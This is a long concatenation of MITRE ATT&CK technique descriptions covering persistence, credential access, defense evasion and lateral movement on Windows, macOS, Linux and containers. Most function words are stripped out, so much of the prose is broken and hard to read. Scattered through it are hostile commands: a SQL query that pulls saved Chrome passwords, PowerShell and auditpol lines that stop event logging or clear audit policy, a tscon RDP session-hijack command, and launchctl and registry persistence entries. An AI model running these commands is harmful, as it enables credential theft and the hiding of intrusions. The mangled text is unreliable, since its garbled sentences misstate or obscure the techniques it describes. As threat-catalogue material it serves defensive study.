Utilizing shims adversary perform malicious acts elevate privileges, install backdoors, disable defenses Windows Defender, etc. (Citation: FireEye Application Shimming) Shims abused establish persistence continuously invoked programs. Adversaries search compromised systems insecurely stored credentials. credentials stored misplaced locations system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)), operating application-specific repositories (e.g. [Credentials Registry](https://attack.mitre.org/techniques/T1552/002)), specialized files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)). Adversaries port monitors adversary supplied DLL boot persistence privilege escalation. port monitor set <code>AddMonitor</code> API set DLL loaded startup.(Citation: AddMonitor) DLL located <code>C:\Windows\System32</code> loaded print spooler service, spoolsv.exe, boot. spoolsv.exe process runs level permissions.(Citation: Bloxham) Alternatively, arbitrary DLL loaded permissions writing fully-qualified pathname DLL <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. 

The Registry key entries following:

* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port

Adversaries technique load malicious code startup persist reboot execute SYSTEM. Adversaries modify mail application data remove evidence activity. Email applications users programs export delete mailbox data command tools APIs. Mail application data emails logs generated application operating system, export requests. 

Adversaries manipulate email mailbox data remove logs artifacts, evidence [Phishing](https://attack.mitre.org/techniques/T1566)/[Internal Spearphishing](https://attack.mitre.org/techniques/T1534), [Email Collection](https://attack.mitre.org/techniques/T1114), [Mail Protocols](https://attack.mitre.org/techniques/T1071/003) command control, email-based exfiltration [Exfiltration Alternative Protocol](https://attack.mitre.org/techniques/T1048). example, remove evidence Exchange servers adversaries <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) module, including <code>Remove-MailboxExportRequest</code> remove evidence mailbox exports.(Citation: Volexity SolarWinds)(Citation: ExchangePowerShell Module) Linux macOS, adversaries delete emails command utility called <code>mail</code>  [AppleScript](https://attack.mitre.org/techniques/T1059/002) interact APIs macOS.(Citation: Cybereason Cobalt Kitty 2017)(Citation: mailx page) Adversaries Login Hook establish persistence executed user logon. login hook plist file specific script execute root privileges user logon. plist file located <code>/Library/Preferences/com.apple.loginwindow.plist</code> file modified <code>defaults</code> command-line utility. behavior logout hooks script executed user logout. hooks require administrator permissions modify create hooks.(Citation: Login Scripts Apple Dev)(Citation: LoginWindowScripts Apple Dev) 

Adversaries add insert path malicious script <code>com.apple.loginwindow.plist</code> file, <code>LoginHook</code> <code>LogoutHook</code> key-value pair. malicious script executed user login. login hook exists, adversaries add additional commands existing login hook. login logout hook time.(Citation: S1 macOs Persistence)(Citation: Wardle Persistence Chapter)

**Note:** Login hooks deprecated 10.11 version macOS favor [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) [Launch Agent](https://attack.mitre.org/techniques/T1543/001)  Adversaries inject code processes evade process-based defenses elevate privileges. Process injection method executing arbitrary code address space separate live process. Running code context process access process's memory, system/network resources, elevated privileges. Execution process injection evade detection security products execution masked legitimate process. 

There inject code process, abuse legitimate functionalities. implementations exist major OS typically platform specific. 

More sophisticated samples perform multiple process injections segment modules evade detection, utilizing named pipes inter-process communication (IPC) mechanisms communication channel.  Bash track commands users type command-line "history" utility. user logs out, history flushed user’s <code>.bash_history</code> file. user, file resides location: <code>~/.bash_history</code>. Typically, file track user’s 500 commands. Users type usernames passwords command-line parameters programs, saved file log out. Attackers abuse file potential credentials. (Citation: External DA, OS Way) Adversaries traffic signaling hide ports malicious functionality persistence command control. Traffic signaling involves magic sequence trigger special response, closed port executing malicious task. form sending series packets characteristics port adversary command control. series packets consists attempted connections predefined sequence closed ports [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), involve unusual flags, specific strings, unique characteristics. sequence completed, port accomplished host-based firewall, implemented custom software.

Adversaries communicate port, service listening port respond commands trigger malicious functionality passed magic value(s).

The observation signal packets trigger communication conducted methods. means, originally implemented Cd00r (Citation: Hartrell cd00r 2002), libpcap libraries sniff packets question. method leverages raw sockets, enables malware ports programs.

On network devices, adversaries crafted packets enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) standard services offered device telnet.  signaling closed service port telnet, trigger module modification malware implants device, adding, removing, changing malicious capabilities.  Adversaries crafted packets attempt connect (open closed) ports, attempt connect router interface, broadcast, network address IP port achieve goals objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  enable traffic signaling embedded devices, adversaries achieve leverage [Patch Image](https://attack.mitre.org/techniques/T1601/001) monolithic nature architecture.

Adversaries Wake-on-LAN feature powered systems. Wake-on-LAN hardware feature powered powered on, woken up, sending magic packet it. powered on, target lateral movement.(Citation: Bleeping - Ryuk WoL)(Citation: AMD Magic Packet) Adversaries acquire credentials browsers reading files specific target browser.  (Citation: Talos Olympic Destroyer 2018) 

Web browsers commonly save credentials usernames passwords entered manually future. browsers typically store credentials encrypted format credential store; however, methods exist extract plaintext credentials browsers.

For example, Windows systems, encrypted credentials Google Chrome reading database file, <code>AppData\Local\Google\Chrome\User Data\Default\Login Data</code> executing SQL query: <code>SELECT action_url, username_value, password_value logins;</code>. plaintext password passing encrypted credentials Windows API function <code>CryptUnprotectData</code>, victim’s cached logon credentials decryption key. (Citation: CryptUnprotectData April 2018)
 
Adversaries executed procedures common browsers FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer 2018)(Citation: FireEye HawkEye Malware July 2017)

Adversaries acquire credentials searching browser process memory patterns commonly match credentials.(Citation: GitHub Mimikittenz July 2016)

After acquiring credentials browsers, adversaries attempt recycle credentials systems accounts expand access. result adversary's objective credentials gained browsers overlap privileged accounts (e.g. domain administrator). Adversaries bypass process signature-based defenses proxying execution malicious content signed, trusted, binaries. Binaries technique Microsoft-signed files, indicating downloaded native operating system.(Citation: LOLBAS Project) Binaries signed trusted digital certificates typically execute Windows systems protected digital signature validation. signed binaries default Windows installations proxy execution files commands.

Similarly, Linux systems adversaries abuse trusted binaries <code>split</code> proxy execution malicious commands.(Citation: split page)(Citation: GTFO split) **This technique deprecated used.**

The <code>source</code> command loads functions current executes files current context. built-in command <code>source /path/to/filename [arguments]</code> <code>.**This technique deprecated used.** /path/to/filename [arguments]</code>. note space ".". space, created runs program running program current context. features functions update specific shell's environment.(Citation: Source Manual)

Adversaries abuse functionality execute programs. file executed technique marked executable beforehand. Windows systems common method required DLLs load program. (Citation: DLL Search) Adversaries advantage Windows DLL search programs ambiguously DLLs gain privilege escalation persistence. 

Adversaries perform DLL preloading, called binary planting attacks, (Citation: OWASP Binary Planting) placing malicious DLL ambiguously DLL location Windows searches legitimate DLL. location current directory program. Remote DLL preloading attacks occur program sets current directory remote location share loading DLL. (Citation: 2269637) Adversaries behavior program load malicious DLL. 

Adversaries modify program loads DLLs replacing existing DLL modifying .manifest .local redirection file, directory, junction program load DLL maintain persistence privilege escalation. (Citation: DLL Redirection) (Citation: Manifests) (Citation: Mandiant Search Order)

If search order-vulnerable program configured privilege level, adversary-controlled DLL loaded executed level. case, technique privilege escalation user administrator administrator SYSTEM, depending program.

Programs fall victim path hijacking behave malicious DLLs configured load legitimate DLLs meant replace. operating systems boot up, start programs applications called services perform background functions. (Citation: TechNet Services) service's configuration information, including file path service's executable, stored Windows Registry. 

Adversaries install service configured execute startup utilities interact services modifying Registry. service disguised operating benign software [Masquerading](https://attack.mitre.org/techniques/T1036). Services created administrator privileges executed privileges, adversary service escalate privileges administrator SYSTEM. Adversaries start services [Service Execution](https://attack.mitre.org/techniques/T1035). Adversaries modify file time attributes hide existing files. Timestomping technique modifies timestamps file (the modify, access, create, change times), mimic files folder. done, example, files modified created adversary conspicuous forensic investigators file analysis tools.

Timestomping file [Masquerading](https://attack.mitre.org/techniques/T1036) hide malware tools.(Citation: WindowsIR Anti-Forensic Techniques) Adversaries reflectively load code process conceal execution malicious payloads. Reflective loading involves allocating executing payloads memory process, vice creating thread process file path disk. Reflectively loaded payloads compiled binaries, anonymous files (only RAM), snubs fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL)

Reflective code injection [Process Injection](https://attack.mitre.org/techniques/T1055) “injection” loads code processes’ memory separate process. Reflective loading evade process-based detections execution arbitrary code masked legitimate benign process. Reflectively loading payloads memory avoid creating files artifacts disk, enabling malware payloads encrypted (or obfuscated) execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Rat Tricks) Adversaries break container gain access underlying host. adversary access containerized resources host level host itself. principle, containerized resources provide separation application functionality isolated host environment.(Citation: Docker Overview)

There multiple adversary escape host environment. Examples include creating container configured mount host’s filesystem bind parameter, adversary drop payloads execute control utilities cron host; utilizing privileged container commands load malicious kernel module underlying host; abusing calls `unshare` `keyctl` escalate privileges steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)

Additionally, adversary exploit compromised container mounted container management socket, `docker.sock`, break container [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries escape [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068), exploiting vulnerabilities global symbolic links access root directory host machine.(Citation: Windows Server Containers Open)

Gaining access host provide adversary opportunity achieve follow-on objectives, establishing persistence, moving laterally environment, setting command control channel host. Adversaries create modify shortcuts execute program boot user login. Shortcuts symbolic links reference files programs executed shortcut clicked executed startup process.

Adversaries abuse shortcuts startup folder execute tools achieve persistence.(Citation: Shortcut Persistence ) payloads infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries create shortcut indirection, abusing [Masquerading](https://attack.mitre.org/techniques/T1036) malicious shortcut legitimate program. Adversaries edit target path replace existing shortcut malware executed intended legitimate program.

Shortcuts abused establish persistence implementing methods. example, LNK browser extensions modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) persistently launch malware. Adversaries attempt listing application windows. Window listings convey context collected keylogger.(Citation: Prevailion DarkWatchman 2021) Adversaries explicitly employ encryption algorithm conceal command control traffic relying inherent protections communication protocol. secure algorithm, implementations vulnerable reverse engineering secret encoded generated malware samples/configuration files. Adversaries attempt listing email addresses accounts. Adversaries dump Exchange address lists global address lists (GALs).(Citation: Exchange Address Lists)

In on-premises Exchange Exchange Online, the<code>Get-GlobalAddressList</code> PowerShell cmdlet email addresses accounts domain authenticated session.(Citation: getglobaladdresslist)(Citation: Black Hills Attacking Exchange MailSniper, 2016)

In Google Workspace, GAL shared Outlook users Google Workspace Sync Outlook (GWSMO) service. Additionally, Google Workspace Directory users listing users organization.(Citation: Google Workspace Global Access List) **This technique deprecated used.**

A type-1 hypervisor software layer sits guest operating systems system's hardware. (Citation: Wikipedia Hypervisor) virtual running environment operating system. common hypervisor Xen. (Citation: Wikipedia Xen) type-1 hypervisor operates level operating designed [Rootkit](https://attack.mitre.org/techniques/T1014) functionality hide existence guest operating system. (Citation: Myers 2007) malicious hypervisor nature persist systems interruption. Adversaries employ time-based methods detect avoid virtualization analysis environments. include enumerating time-based properties, uptime clock, timers triggers avoid virtual machine environment (VME) sandbox, automated operate limited time.

Adversaries employ time-based evasions, delaying malware functionality initial execution programmatic sleep commands native scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays based waiting specific victim conditions met (ex: time, events, etc.) employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) avoid analysis scrutiny.(Citation: Deloitte Environment Awareness)

Benign commands operations delay malware execution. Loops needless repetitions commands, [Ping](https://attack.mitre.org/software/S0097)s, delay malware execution exceed time thresholds automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) variation, commonly referred API hammering, involves calls [Native API](https://attack.mitre.org/techniques/T1106) functions delay execution (while overloading analysis environments junk data).(Citation: Joe Nymaim)(Citation: Joe Trickbot)

Adversaries time metric detect sandboxes analysis environments, attempt manipulate time mechanisms simulate elapses time. example, adversary identify sandbox accelerating time sampling calculating expected environment's timestamp execution sleep function.(Citation: ISACA Malware Tricks) Dynamic-link libraries (DLLs) AppCertDLLs Registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager</code> loaded process calls ubiquitously application programming interface (API) functions CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, WinExec. (Citation: Elastic Process Injection July 2017)

Similar [Process Injection](https://attack.mitre.org/techniques/T1055), abused persistence privilege escalation causing malicious DLL loaded context separate processes computer. Adversaries abuse CMSTP proxy execution malicious code. Connection Manager Profile Installer (CMSTP.exe) command-line program install Connection Manager service profiles. (Citation: Connection Manager Oct 2009) CMSTP.exe accepts installation file (INF) parameter installs service profile leveraged remote access connections.

Adversaries supply CMSTP.exe INF files infected malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe abused load execute DLLs (Citation: MSitPros CMSTP Aug 2017)  scriptlets (SCT) remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) execution bypass AppLocker application control defenses CMSTP.exe legitimate binary signed Microsoft.

CMSTP.exe abused [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002) execute arbitrary commands malicious INF auto-elevated interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) Adversaries hijack legitimate user's SSH session laterally environment. Secure (SSH) standard remote access Linux macOS systems. user connect encrypted tunnel, commonly authenticating password, certificate asymmetric encryption key pair.

In laterally compromised host, adversaries advantage trust relationships established systems public key authentication active SSH sessions hijacking existing connection system. occur compromising SSH agent access agent's socket. adversary root access, hijacking SSH sessions trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)

[SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs [SSH](https://attack.mitre.org/techniques/T1021/004) hijacks existing SSH session creating session [Valid Accounts](https://attack.mitre.org/techniques/T1078). Adversaries disable Windows event logging limit data leveraged detections audits. Windows event logs record user activity login attempts, process creation, more.(Citation: Windows Log Events) data security tools analysts generate detections.

The EventLog service maintains event logs components applications.(Citation: EventLog_Core_Technologies) default, service automatically starts powers on. audit policy, maintained Local Security Policy (secpol.msc), defines events EventLog service logs. Security audit policy settings changed running secpol.msc, navigating <code>Security Settings\Local Policies\Audit Policy</code> basic audit policy settings <code>Security Settings\Advanced Audit Policy Configuration</code> advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> set audit policies.(Citation: auditpol)

Adversaries target system-wide logging application. example, EventLog service disabled PowerShell line: <code>Stop-Service -Name EventLog</code>.(Citation: Disable_Win_Event_Logging) Additionally, adversaries <code>auditpol</code> sub-commands command prompt disable auditing audit policy. enable disable setting audit category, adversaries <code>/success</code> <code>/failure</code> parameters. example, <code>auditpol /set /category:”Account Logon” /success:disable /failure:disable</code> auditing Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) audit policy, adversaries lines: <code>auditpol /clear /y</code> <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)

By disabling Windows event logging, adversaries operate leaving evidence compromise behind. Adversaries schedule data exfiltration performed times day intervals. blend traffic patterns normal activity availability.

When scheduled exfiltration used, exfiltration techniques apply transfer network, [Exfiltration C2 Channel](https://attack.mitre.org/techniques/T1041) [Exfiltration Alternative Protocol](https://attack.mitre.org/techniques/T1048). Adversaries [Valid Accounts](https://attack.mitre.org/techniques/T1078) interact remote network share Server Message Block (SMB). adversary perform actions logged-on user.

SMB file, printer, serial port sharing protocol Windows machines network domain. Adversaries SMB interact file shares, allowing laterally network. Linux macOS implementations SMB typically Samba.

Windows systems hidden network shares accessible administrators provide ability remote file administrative functions. network shares include `C$`, `ADMIN$`, `IPC$`. Adversaries technique conjunction administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) remotely access networked SMB,(Citation: Wikipedia Server Message Block) interact systems remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, transferred binaries remote Execution. execution techniques rely authenticated sessions SMB/RPC [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries NTLM hashes access administrator shares systems [Pass Hash](https://attack.mitre.org/techniques/T1550/002) configuration patch levels.(Citation: Admin Shares) Adversaries implant cloud container images malicious code establish persistence gaining access environment. Amazon Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, Azure Images popular container runtimes Docker implanted backdoored. [Upload Malware](https://attack.mitre.org/techniques/T1608/001), technique focuses adversaries implanting image registry victim’s environment. Depending infrastructure provisioned, provide persistent access infrastructure provisioning tool instructed image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)

A tool developed facilitate planting backdoors cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) adversary access compromised AWS instance, permissions list container images, implant backdoor [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019) Adversaries tunnel network communications victim separate protocol avoid detection/network filtering enable access unreachable systems. Tunneling involves explicitly encapsulating protocol another. behavior conceal malicious traffic blending existing traffic provide outer layer encryption (similar VPN). Tunneling enable routing network packets reach intended destination, SMB, RDP, traffic filtered network appliances routed Internet. 

There encapsulate protocol protocol. example, adversaries perform SSH tunneling (also SSH port forwarding), involves forwarding arbitrary data encrypted SSH tunnel.(Citation: SSH Tunneling) 

[Protocol Tunneling](https://attack.mitre.org/techniques/T1572) abused adversaries [Dynamic Resolution](https://attack.mitre.org/techniques/T1568). DNS HTTPS (DoH), queries resolve C2 infrastructure encapsulated encrypted HTTPS packets.(Citation: BleepingComp Godlua JUL19) 

Adversaries leverage [Protocol Tunneling](https://attack.mitre.org/techniques/T1572) conjunction [Proxy](https://attack.mitre.org/techniques/T1090) [Protocol Impersonation](https://attack.mitre.org/techniques/T1001/003) conceal C2 communications infrastructure.  Adversaries abuse control.exe proxy execution malicious payloads. Windows Control Panel process binary (control.exe) handles execution Control Panel items, utilities users view adjust settings.

Control Panel items registered executable (.exe) Control Panel (.cpl) files, renamed dynamic-link library (.dll) files export <code>CPlApplet</code> function.(Citation: Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) ease use, Control Panel items typically include graphical menus users registered loaded Control Panel.(Citation: Implementing CPL) Control Panel items executed command line, programmatically application programming interface (API) call, simply double-clicking file.(Citation: Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)

Malicious Control Panel items delivered [Phishing](https://attack.mitre.org/techniques/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) executed multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, CPL files, bypass application file extension lists.

Adversaries rename malicious DLL files (.dll) Control Panel file extensions (.cpl) register <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls</code>. registered DLLs comply CPL file specification export <code>CPlApplet</code> functions, loaded executed <code>DllEntryPoint</code> Control Panel executed. CPL files exporting <code>CPlApplet</code> executable.(Citation: ESET InvisiMole June 2020) Adversaries bridge network boundaries modifying network device’s Network Address Translation (NAT) configuration. Malicious modifications NAT enable adversary bypass restrictions traffic routing separate trusted untrusted networks.

Network devices routers firewalls connect multiple networks implement NAT process passing packets networks. performing NAT, network device rewrite source destination addresses IP address header. network designs require NAT packets cross border device.  typical environments internal networks non-Internet routable addresses.(Citation: RFC1918)

When adversary gains control network boundary device, leverage existing NAT configurations send traffic separated networks, implement NAT configurations design.  network designs require NAT function, enables adversary overcome inherent routing limitations prevent accessing protected systems border device.  network designs require NAT, address translation adversaries obscure activities, changing addresses packets traverse network boundary device monitoring data transmissions challenging defenders.  

Adversaries [Patch Image](https://attack.mitre.org/techniques/T1601/001) change operating network device, implementing custom NAT mechanisms obscure activities Adversaries upload tools third-party adversary controlled infrastructure accessible targeting. Tools closed source, commercial. Tools malicious purposes adversary, (unlike malware) intended purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries upload tools support operations, tool victim network enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) placing Internet accessible server.

Tools infrastructure purchased/rented adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools staged services, adversary controlled GitHub repo, Platform-as-a-Service offerings enable users easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)

Adversaries avoid upload tool compromised victim machines download tool third-party hosting location (ex: non-adversary controlled GitHub repo), including original hosting tool. Adversaries abuse security support providers (SSPs) execute DLLs boots. Windows SSP DLLs loaded Local Security Authority (LSA) process start. loaded LSA, SSP DLLs access encrypted plaintext passwords stored Windows, logged-on user's Domain password smart card PINs.

The SSP configuration stored Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. adversary modify Registry add SSPs, loaded time boots, AddSecurityPackage Windows API function called.(Citation: Graeber 2014) Winlogon.exe Windows component responsible actions logon/logoff secure attention sequence (SAS) triggered Ctrl-Alt-Delete. Registry entries <code>HKLM\Software\[Wow6432Node\]Microsoft\Windows NT\CurrentVersion\Winlogon\</code> <code>HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\</code> manage additional helper programs functionalities support Winlogon. (Citation: Cylance Reg Persistence Sept 2013) 

Malicious modifications Registry Winlogon load execute malicious DLLs executables. Specifically, subkeys vulnerable abuse: (Citation: Cylance Reg Persistence Sept 2013)

* Winlogon\Notify - notification package DLLs handle Winlogon events
* Winlogon\Userinit - userinit.exe, user initialization program executed user logs on
* Winlogon\Shell - explorer.exe, executed user logs on

Adversaries advantage features repeatedly execute malicious code establish Persistence. Adversaries binary padding add junk data change on-disk representation malware functionality behavior binary. increase size binary security tools capable handling file size limitations.

Binary padding effectively checksum file avoid hash-based blacklists static anti-virus signatures.(Citation: ESET OceanLotus) padding commonly generated function create junk data appended applied sections malware.(Citation: Securelist Malware Tricks April 2017) Increasing file size decrease effectiveness tools detection capabilities designed configured scan files. reduce likelihood collected analysis. Public file scanning services, VirusTotal, limits maximum size uploaded file analyzed.(Citation: VirusTotal FAQ)
 Adversaries alternate authentication material, password hashes, Kerberos tickets, application access tokens, laterally environment bypass normal access controls. 

Authentication processes require valid identity username) authentication factors password, pin, physical smart card, token generator, etc.). Alternate authentication material legitimately generated systems user application authenticates providing valid identity required authentication factor(s). Alternate authentication material generated identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)

Caching alternate authentication material verify identity authenticated user reenter authentication factor(s). alternate authentication maintained system—either memory disk—it risk stolen [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. stealing alternate authentication material, adversaries bypass access controls authenticate systems knowing plaintext password additional authentication factors.
 Remote desktop common feature operating systems. user log interactive session desktop graphical user interface remote system. refers implementation Remote Desktop Protocol (RDP) Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) implementations third-party tools provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) RDS.

Adversaries connect remote RDP/RDS expand access service enabled access accounts credentials. Adversaries Credential Access techniques acquire credentials RDP. Adversaries RDP conjunction [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique Persistence. (Citation: Alperovitch Malware)

Adversaries perform RDP session hijacking involves stealing legitimate user's remote session. Typically, user notified steal session prompted question. permissions Terminal Services Console, <code>c:\windows\system32\tscon.exe [session stolen]</code>, adversary hijack session credentials prompts user. (Citation: RDP Hijacking Korznikov) remotely locally active disconnected sessions. (Citation: RDP Hijacking Medium) lead [Remote Discovery](https://attack.mitre.org/techniques/T1018) Privilege Escalation stealing Domain Admin privileged account session. native Windows commands, feature RedSnarf. (Citation: Kali Redsnarf) Adversaries search private data threat intelligence vendors targeting. Threat intelligence vendors offer paid feeds portals offer data publicly reported. sensitive details (such customer names identifiers) redacted, trends breaches target industries, attribution claims, successful TTPs/countermeasures.(Citation: D3Secutrity CTI Feeds)

Adversaries search private threat intelligence vendor data gather actionable information. Threat actors seek information/indicators gathered campaigns, conducted adversaries align target industries, capabilities/objectives, operational concerns. reported vendors reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), initial access (ex: [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190) [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries attempt exfiltrate data network medium command control channel. command control network wired Internet connection, exfiltration occur, example, WiFi connection, modem, cellular data connection, Bluetooth, radio frequency (RF) channel.

Adversaries choose sufficient access proximity, connection secured defended primary Internet-connected channel routed enterprise network. Adversaries access network configuration files collect sensitive data device network. network configuration file parameters determine operation device. device typically stores in-memory configuration operating, separate configuration non-volatile storage load device reset. Adversaries inspect configuration files reveal target network layout, network device software, identifying legitimate accounts credentials use.

Adversaries common management tools protocols, Simple Network Management Protocol (SNMP) Smart Install (SMI), access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) tools query specific data configuration repository configure device export configuration analysis.  Adversaries gather victim's identity targeting. identities include variety details, including personal data (ex: employee names, email addresses, etc.) sensitive details credentials.

Adversaries gather ways, direct elicitation [Phishing Information](https://attack.mitre.org/techniques/T1598). users enumerated active [Active Scanning](https://attack.mitre.org/techniques/T1595)) probing analyzing responses authentication services reveal valid usernames system.(Citation: GrimBlog UsernameEnum) victims exposed adversaries online accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)

Gathering reveal opportunities forms reconnaissance (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Phishing Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) [Valid Accounts](https://attack.mitre.org/techniques/T1078)). Windows Authentication Package DLLs loaded Local Security Authority (LSA) process start. provide support multiple logon processes multiple security protocols operating system. (Citation: MSDN Authentication Packages)

Adversaries autostart mechanism LSA Authentication Packages persistence placing reference binary Windows Registry location <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> key <code>"Authentication Packages"=<target binary></code>. binary executed authentication packages loaded. creating window, graphical Windows-based processes prescribe register windows class, stipulate appearance behavior (via windows procedures, functions handle input/output data). (Citation: Window Classes) Registration windows classes include request 40 bytes extra window memory (EWM) appended allocated memory instance class. EWM intended store data specific window specific application programming interface (API) functions set value. (Citation: GetWindowLong function) (Citation: SetWindowLong function)

Although small, EWM store 32-bit pointer windows procedure. Malware utilize memory location attack chain includes writing code shared sections process’s memory, placing pointer code EWM, invoking execution returning execution control address process’s EWM.

Execution granted EWM injection address space separate live process. [Process Injection](https://attack.mitre.org/techniques/T1055), access target process's memory elevated privileges. Writing payloads shared sections avoids highly monitored API calls WriteProcessMemory CreateRemoteThread. (Citation: Elastic Process Injection July 2017) sophisticated malware samples bypass protection mechanisms data execution prevention (DEP) triggering combination windows procedures functions rewrite malicious payload executable portion target process. (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz Redyms Mar 2013) Adversaries disable modify firewalls bypass controls limiting network usage. disabling entire mechanism adding, deleting, modifying rules. numerous depending operating system, including command-line, editing Windows Registry keys, Windows Control Panel.

Modifying disabling firewall enable adversary C2 communications, lateral movement, data exfiltration allowed.  adversary compress encrypt data collected prior exfiltration. Compressing data obfuscate collected data minimize data network. Encryption hide exfiltrated detection exfiltration conspicuous inspection defender.

Both compression encryption prior exfiltration, performed utility, 3rd party library, custom method. Launchctl controls macOS launchd process handles launch agents launch daemons, execute commands programs itself. Launchctl supports subcommands command-line, interactively, redirected standard input. loading reloading launch agents launch daemons, adversaries install persistence execute  (Citation: Sofacy Komplex Trojan). Running command launchctl simple <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute "arg" "arg" "arg"</code>. Loading, unloading, reloading launch agents launch daemons require elevated privileges. 

Adversaries abuse functionality execute code bypass whitelisting launchctl allowed process. Adversaries tamper SIP trust provider components mislead operating application control tools conducting signature validation checks. user mode, Windows Authenticode (Citation: Authenticode) digital signatures verify file's origin integrity, variables establish trust signed code (ex: driver valid signature handled safe). signature validation process handled WinVerifyTrust application programming interface (API) function,  (Citation: WinVerifyTrust) accepts inquiry coordinates trust provider, responsible validating parameters signature. (Citation: SpectorOps Subverting Trust Sept 2017)

